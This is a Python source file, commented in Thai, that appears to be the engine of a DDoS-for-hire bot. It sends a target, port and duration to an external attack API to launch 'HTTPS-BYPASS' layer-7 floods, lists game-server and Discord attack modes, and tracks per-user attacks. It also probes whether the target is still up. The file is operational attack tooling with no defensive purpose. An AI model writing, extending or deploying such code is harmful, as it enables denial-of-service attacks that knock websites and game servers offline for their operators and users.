# attack_engine.py
"""
Attack Engine — ใช้ API แทน Worker
"""
import asyncio
import time
import aiohttp
from attack_api import fire
from config import API_METHOD


class AttackEngine:
    def __init__(self):
        self.running_users: dict[int, dict] = {}

    def is_running(self, user_id: int) -> bool:
        return user_id in self.running_users

    def any_running(self) -> bool:
        return bool(self.running_users)

    async def attack_via_api(self, target: str, port: int, duration: int,
                             mode: str = "l7") -> dict:
        """
        ยิงผ่าน API
        mode: l7 / l4 / minecraft / freefire / discord
        """
        # API นี้รองรับแค่ L7 HTTPS-BYPASS
        # ถ้า mode อื่น → แจ้งเตือน
        if mode != "l7":
            return {
                "success": False,
                "error": f"API นี้รองรับแค่ L7 (HTTPS-BYPASS) — mode '{mode}' ไม่รองรับ"
            }

        # เรียก API
        result = await fire(target, port, duration, API_METHOD)
        return result

    async def stop_attack(self, user_id: int):
        """หยุด attack (API ไม่มี endpoint stop → แค่ clear state)"""
        self.running_users.pop(user_id, None)

    async def measure_speed(self, target: str, port: int) -> str:
        """วัดความเร็วเป้าหมาย (ใช้ aiohttp)"""
        if target.startswith("http"):
            url = target
        else:
            scheme = "https" if port in (443, 8443) else "http"
            url = f"{scheme}://{target}:{port}"
        try:
            start = time.time()
            async with aiohttp.ClientSession() as s:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=3)) as r:
                    await r.read()
            ms = int((time.time() - start) * 1000)
            return f"{ms}ms"
        except Exception:
            return "offline"